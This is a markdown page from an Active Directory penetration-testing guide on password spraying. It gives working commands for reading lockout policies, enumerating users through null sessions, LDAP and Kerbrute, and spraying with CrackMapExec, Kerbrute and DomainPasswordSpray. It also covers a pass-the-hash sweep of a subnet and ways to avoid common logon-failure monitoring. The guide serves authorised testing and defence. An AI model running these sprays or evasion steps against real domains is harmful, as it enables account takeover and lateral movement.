---
title: "Password Spraying & Password Policies"
description: "Reading the lockout policy safely, building a target user list, and spraying passwords against a domain from both Linux and Windows."
tags:
  - Active Directory
  - Password Spraying
  - Password Policy
  - Kerbrute
---

# Password Spraying & Password Policies

Password spraying is the second parallel route to a foothold alongside [LLMNR/NBT-NS poisoning](llmnr-nbtns-poisoning.md). It works even when poisoning doesn't, because it exploits something poisoning can't fix: predictable human password choices.

## Spraying vs. brute force

| Term | Definition | Lockout risk |
| :--- | :--- | :--- |
| **Password spraying** | One common password, tried against **many** usernames | Low — each account only sees one attempt per round |
| **Brute forcing** | Many passwords, tried against **one** username | High — triggers lockout almost immediately |

```text
Round 1: every username + "Welcome1"
   ↓ (wait)
Round 2: every username + "Summer2026!"
   ↓ (wait)
Round 3: every username + "Password123"
```

Spraying works because defaults like `Welcome1`, `Password1`, or a seasonal variant technically satisfy most complexity policies while still being guessable — and in any org of a few hundred users, odds are good that *someone* used one.

!!! danger "Read this before you run a single spray"
    A careless spray locks out every account in the business. Always learn the password policy first, always throttle to stay under the lockout threshold, and always log what you did — target, DC, password, and timestamp — so the client can correlate an alert against your authorised activity.

## Step 1 — get the password policy first

The policy tells you the two numbers that matter: how many bad attempts before lockout, and how long the counter takes to reset. The method depends on what access you already have.

| Scenario | Method |
| :--- | :--- |
| Have valid creds, on Linux | `crackmapexec --pass-pol` |
| No creds, SMB null session works | `rpcclient` / `enum4linux(-ng)` |
| No creds, LDAP anonymous bind works | `ldapsearch` / `windapsearch` |
| On Windows, no tool transfer allowed | `net accounts` |
| On Windows, tools allowed | PowerView `Get-DomainPolicy` |

### Credentialed (Linux) — CrackMapExec

```bash
crackmapexec smb <DC_IP> -u avazquez -p Password123 --pass-pol
```

### SMB null session (Linux) — rpcclient / enum4linux(-ng)

A legacy DC that's been upgraded through several Windows Server versions often carries forward an insecure default that still allows unauthenticated enumeration.

```bash
rpcclient -U "" -N <DC_IP>
rpcclient $> querydominfo
rpcclient $> getdompwinfo
```

```bash
enum4linux -P <DC_IP>              # classic, built on nmblookup/net/rpcclient/smbclient
enum4linux-ng -P <DC_IP> -oA ilfreight   # Python rewrite, exports YAML/JSON with -oA
```

### LDAP anonymous bind (Linux)

A misconfiguration left over from pre-2003-era AD defaults — some application still requires anonymous LDAP, and the bind was never locked back down.

```bash
ldapsearch -H ldap://<DC_IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

### Authenticated (Windows) — net.exe / PowerView

`net accounts` needs nothing transferred to disk — useful when AV/EDR blocks tool drops:

```powershell
net accounts
```

```text
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                     5
Lockout duration (minutes):                            30
Lockout observation window (minutes):                  30
```

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
# Same data, plus PasswordComplexity and the Kerberos ticket-age policy
```

### Reading the policy

- **Minimum length 8** — common but weak; 10-14+ is a better domain to encounter as a defender.
- **Lockout threshold 5, window 30 min** — standard; safe to try roughly 2-3 passwords per 31-minute window.
- **Lockout threshold 0 / not set** — no lockout at all. Great for the attacker, but flag it as a finding — the org has zero protection against brute force.
- **Manual-unlock-only policies** are high risk for the tester: locking out an account there means a helpdesk ticket, not an automatic 30-minute wait.

### Default policy, if nobody ever touched it

| Policy | Default |
| :--- | :--- |
| Minimum password length | **7** |
| Password history | 24 |
| Complexity | Enabled |
| Account lockout threshold | **0 (disabled)** |

Many organisations never change these — worth checking explicitly rather than assuming "AD defaults are safe".

!!! tip "Policy unknown and you can't get it"
    Ask the client directly if scope allows. If they won't say: either one single "hail-mary" spray with a well-chosen password, or one attempt every few hours. Never assume the textbook 5-attempts/30-minutes default.

## Step 2 — build a target user list

| Method | Needs |
| :--- | :--- |
| SMB null session | Anonymous SMB to the DC |
| LDAP anonymous bind | Anonymous LDAP to the DC |
| Kerbrute + wordlist | Nothing — abuses Kerberos pre-auth |
| Valid credentials | From the client, a prior spray hit, or a poisoning capture |
| External OSINT | Breach data, LinkedIn — see [External Recon](external-recon.md) |

```bash
# SMB null session, one-liner
enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > users.txt

# LDAP anonymous bind
ldapsearch -H ldap://<DC_IP> -x -b "DC=<DOMAIN>,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

# windapsearch, anonymous
./windapsearch.py --dc-ip <DC_IP> -u "" -U
```

### Kerbrute — the stealthy option

Kerbrute abuses **Kerberos pre-authentication** rather than SMB/NTLM logons. It sends a TGT request without pre-auth for each candidate username; the KDC replies `PRINCIPAL UNKNOWN` for an invalid name, or asks for pre-auth for a valid one.

```bash
kerbrute userenum -d <DOMAIN> --dc <DC_IP> /opt/jsmith.txt > kerbrute.txt
```

```bash
# extract just the valid usernames
grep -oP '(?<=VALID USERNAME:\s{2}).*' kerbrute.txt > valid_users.txt
```

**Why it's quieter:** username enumeration this way does **not** trigger Event ID 4625 (logon failure), the most commonly monitored auth-failure event. It instead generates Event ID 4768 (TGT requested) — which only shows up if Kerberos logging was explicitly enabled via GPO.

| Event ID | Trigger | Commonly monitored? |
| :--- | :--- | :--- |
| 4625 | Logon failure (SMB/NTLM) | Yes |
| 4768 | Kerberos TGT requested | Only if Kerberos logging enabled |
| 4771 | Kerberos pre-auth failed | Sometimes |

Wordlist source: the `statistically-likely-usernames` GitHub repo's `jsmith.txt` (first-initial + lastname format, ~48,700 entries) checks tens of thousands of candidates in seconds.

!!! note "Username enum is quiet; the spray that follows is not"
    Once you switch from `userenum` to `passwordspray`, every failed Kerberos pre-auth attempt counts toward the real lockout threshold exactly the same as an SMB logon failure would.

### When even standard lists fail — document metadata

PDFs and Office documents a company publishes externally often carry their **author field** in the metadata, which can reveal a username format that LinkedIn scraping never would — including fully-random-looking formats (e.g. a 4-character GUID). If the generation pattern can be reverse-engineered, you can brute-force the entire namespace and feed it straight to Kerbrute:

```bash
#!/bin/bash
for x in {{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}{{A..Z},{0..9}}
    do echo $x
done
```

A fully enumerable "random" format can beat a predictable `flast` list, because it gets closer to 100% coverage of real accounts instead of the ~40-60% a guessed format typically yields.

### Filter before you spray

```bash
# credentialed user list with badPwdCount, so you can drop near-lockout accounts
sudo crackmapexec smb <DC_IP> -u htb-student -p '<PASSWORD>' --users
```

`badPwdCount` tells you how close an account already is to locking — remove anything near the threshold from the spray list. On multi-DC environments this counter is tracked **per DC**, so for an accurate total either query every DC and sum, or query the DC holding the **PDC Emulator** FSMO role.

## Step 3 — spray

### From Linux

```bash
# rpcclient one-liner — success shows "Authority Name" in the output
for u in $(cat valid_users.txt); do
  rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC_IP> | grep Authority
done
```

```bash
# Kerbrute
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt Welcome1
```

```bash
# CrackMapExec — grep + for hits
sudo crackmapexec smb <DC_IP> -u valid_users.txt -p Password123 | grep +
```

```bash
# validate a hit on its own
sudo crackmapexec smb <DC_IP> -u avazquez -p Password123
```

### From Windows — DomainPasswordSpray

`DomainPasswordSpray.ps1` is the most effective option when your foothold is already domain-joined and domain-authenticated — it does the safety work for you.

```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

```text
[*] The smallest lockout threshold discovered is 5 login attempts.
[*] Removing disabled users from list.
[*] There are 2923 total users found.
[*] Removing users within 1 attempt of locking out from list.
[*] Setting a wait in between sprays (based on observation window).
[*] SUCCESS! User:sgage Password:Welcome1
```

It automatically builds the user list from AD, queries the live password policy, and **excludes any account within one attempt of locking out**. If the host isn't domain-authenticated, supply your own list with `-UserList`.

```powershell
# Kerbrute also runs fine on Windows for the same purpose
kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt Welcome1
```

## Local administrator password reuse

Spraying isn't only for domain accounts. Gold-image deployments frequently ship the **same local Administrator password** to every workstation or server of a given type — a common finding on its own.

```bash
# pass-the-hash spray across a subnet, local-auth only
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <NTLM_HASH> | grep +
```

```text
SMB  172.16.5.50   445  ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator <hash> (Pwn3d!)
SMB  172.16.5.125  445  ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator <hash> (Pwn3d!)
```

!!! warning "Always set `--local-auth` for local-account spraying"
    Without it, CrackMapExec authenticates against the **domain** and can lock out the real domain account in a handful of hosts. With `--local-auth`, each attempt is scoped to that one machine's local SAM — one try per host, zero domain lockout risk.

Other reuse patterns worth a spray round: a desktop password tried against the server fleet, a non-standard local admin account name (e.g. `bsmith`) tried as a domain username, a user's password tried against their own `_adm` account, and — across a trust — the same credential tried in the other domain.

## Mitigations

| Control | Notes |
| :--- | :--- |
| **MFA** | The strongest single mitigation; apply to every external portal (O365, OWA, VPN, Citrix, RDS). Some implementations still leak whether a username/password combo was valid, so don't treat it as a total fix. |
| **Least privilege** | Don't grant every domain user access to every application. |
| **Separate admin accounts** | Keep day-to-day and privileged accounts distinct. |
| **Password filters** | Block dictionary words, season/year patterns, and the company name. |
| **LAPS** | Kills local-admin-password-reuse spraying specifically — see it covered under [Enumerating Security Controls](security-controls.md). |

Detection relies on the same two event IDs: a burst of **4625** (SMB/NTLM) or **4771** (Kerberos pre-auth failed) across many distinct accounts in a short window is the signature of a spray, not a brute force.

## Next

A successful spray — or a cracked poisoning hash — hands you a valid `<DOMAIN>` credential. From here the work moves to [credentialed enumeration](credentialed-enumeration.md).
